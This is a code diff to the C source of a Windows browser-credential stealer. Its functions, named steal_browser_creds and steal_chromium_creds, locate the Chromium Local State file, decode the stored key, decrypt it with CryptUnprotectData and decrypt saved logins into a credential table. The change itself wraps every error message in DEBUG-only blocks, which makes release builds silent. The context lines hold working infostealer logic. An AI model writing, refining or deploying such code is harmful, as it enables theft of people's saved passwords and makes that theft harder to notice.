@@ -35,13 +35,17 @@ static int retrieve_encoded_key(PWSTR localStatePath, PSTR *encodedKeyOut) {
       CreateFileW(localStatePath, GENERIC_READ, FILE_SHARE_READ, NULL,
                   OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
   if (fileHandle == INVALID_HANDLE_VALUE) {
+#ifdef DEBUG
     printf("Failed to open file. Error code: %lu\n", GetLastError());
+#endif
     return EXIT_FAILURE;
   }
 
   DWORD fileSize = GetFileSize(fileHandle, NULL);
   if (fileSize == INVALID_FILE_SIZE) {
+#ifdef DEBUG
     printf("Failed to get file size. Error code: %lu\n", GetLastError());
+#endif
     CloseHandle(fileHandle);
     return EXIT_FAILURE;
   }
@@ -49,7 +53,9 @@ static int retrieve_encoded_key(PWSTR localStatePath, PSTR *encodedKeyOut) {
   // characters in the file are encoded in UTF-8, no need for wide characters
   PSTR fileBuffer = (PSTR)malloc(fileSize + 1);
   if (!fileBuffer) {
+#ifdef DEBUG
     printf("Failed to allocate memory for file buffer.\n");
+#endif
     CloseHandle(fileHandle);
     return EXIT_FAILURE;
   }
@@ -57,7 +63,9 @@ static int retrieve_encoded_key(PWSTR localStatePath, PSTR *encodedKeyOut) {
   DWORD bytesRead;
   if (!ReadFile(fileHandle, fileBuffer, fileSize * sizeof(char), &bytesRead,
                 NULL)) {
+#ifdef DEBUG
     printf("Failed to read file. Error code: %lu\n", GetLastError());
+#endif
     free(fileBuffer);
     CloseHandle(fileHandle);
     return EXIT_FAILURE;
@@ -111,14 +119,18 @@ static int decode_key(PSTR encodedKey, BYTE *decodedKeyOut[],
   DWORD decodedBinarySize = 0;
   if (!CryptStringToBinaryA(encodedKey, 0, CRYPT_STRING_BASE64, NULL,
                             &decodedBinarySize, NULL, NULL)) {
+#ifdef DEBUG
     fprintf(stderr, "Failed getting base64 size. Error code: %lu\n",
             GetLastError());
+#endif
     return EXIT_FAILURE;
   }
 
   BYTE *decodedBinaryData = (BYTE *)malloc(decodedBinarySize);
   if (decodedBinaryData == NULL) {
+#ifdef DEBUG
     fprintf(stderr, "Failed allocating memory\n");
+#endif
     return EXIT_FAILURE;
   }
 
@@ -126,8 +138,10 @@ static int decode_key(PSTR encodedKey, BYTE *decodedKeyOut[],
   if (!CryptStringToBinaryA(encodedKey, 0, CRYPT_STRING_BASE64,
                             decodedBinaryData, &decodedBinarySize, NULL,
                             NULL)) {
+#ifdef DEBUG
     fprintf(stderr, "Failed decoding base64. Error code: %lu\n",
             GetLastError());
+#endif
     free(decodedBinaryData);
     return EXIT_FAILURE;
   }
@@ -140,7 +154,9 @@ static int decode_key(PSTR encodedKey, BYTE *decodedKeyOut[],
 
   *decodedKeyOut = (BYTE *)realloc(decodedBinaryData, newSize);
   if (*decodedKeyOut == NULL) {
+#ifdef DEBUG
     fprintf(stderr, "Failed reallocating memory\n");
+#endif
     free(decodedBinaryData);
     return EXIT_FAILURE;
   }
@@ -161,7 +177,9 @@ static int decrypt_key(BYTE encryptedKey[], size_t encryptedKeySize,
   DataInput.pbData = encryptedKey;
 
   if (!CryptUnprotectData(&DataInput, NULL, NULL, NULL, NULL, 0, &DataOutput)) {
+#ifdef DEBUG
     fprintf(stderr, "Failed decrypting key. Error code: %lu\n", GetLastError());
+#endif
     free(encryptedKey);
     return EXIT_FAILURE;
   }
@@ -193,8 +211,10 @@ static int steal_browser_creds(BrowserInfo browser, Credential * credTab, DWORD3
   PWSTR loginDataPath;
   if (get_logindata_path(browser.loginDataPath, &loginDataPath) !=
       EXIT_SUCCESS) {
+#ifdef DEBUG
     fwprintf(stderr, L"Unable to get login data PATH for %ls\n",
              browser.browserName);
+#endif
     return EXIT_FAILURE;
   }
 
@@ -204,7 +224,9 @@ static int steal_browser_creds(BrowserInfo browser, Credential * credTab, DWORD3
   int loginsCount = 0;
   if (chrmm_retrieve_logins(loginDataPath, &loginsCount, &logins) !=
       EXIT_SUCCESS) {
+#ifdef DEBUG
     fprintf(stderr, "Could not retrieve logins from the database\n");
+#endif
     return EXIT_FAILURE;
   }
 
@@ -220,7 +242,9 @@ static int steal_browser_creds(BrowserInfo browser, Credential * credTab, DWORD3
 
   PSTR encodedKey;
   if (retrieve_encoded_key(localStatePath, &encodedKey) != EXIT_SUCCESS) {
+#ifdef DEBUG
     wprintf(L"Could not retrieve key from %ls\n", localStatePath);
+#endif
     return EXIT_FAILURE;
   }
 
@@ -228,14 +252,18 @@ static int steal_browser_creds(BrowserInfo browser, Credential * credTab, DWORD3
   BYTE *encryptedKey;
   if (decode_key(encodedKey, &encryptedKey, &encryptedKeySize) !=
       EXIT_SUCCESS) {
-    printf("Could not decode %ls\n", encodedKey);
+#ifdef DEBUG
+        printf("Could not decode %ls\n", encodedKey);
+#endif
     return EXIT_FAILURE;
   }
 
   DATA_BLOB decryptedBlob;
   if (decrypt_key(encryptedKey, encryptedKeySize, &decryptedBlob) !=
       EXIT_SUCCESS) {
+#ifdef DEBUG
     fprintf(stderr, "Could not decrypt key\n");
+#endif
     return EXIT_FAILURE;
   }
 
@@ -243,7 +271,9 @@ static int steal_browser_creds(BrowserInfo browser, Credential * credTab, DWORD3
   int credentialsCount = 0;
   if (chrmm_decrypt_logins(logins, loginsCount, decryptedBlob.pbData,
                            &credentials, &credentialsCount) != EXIT_SUCCESS) {
+#ifdef DEBUG
     printf("Failed to decrypt chromium logins\n");
+#endif
   }
 
   for (int i = 0; i < credentialsCount; i++) {
@@ -469,8 +499,10 @@ int steal_chromium_creds(Credential * credTab, DWORD32 * indexCredTab) {
 
   for (int i = 0; i < sizeof(browsers) / sizeof(BrowserInfo); i++) {
     if (steal_browser_creds(browsers[i], credTab, indexCredTab) != EXIT_SUCCESS) {
+#ifdef DEBUG
       fwprintf(stderr, L"Unable to find credentials for %s. Continuing...\n",
                browsers[i].browserName);
+#endif
     }
   }
   return EXIT_SUCCESS;
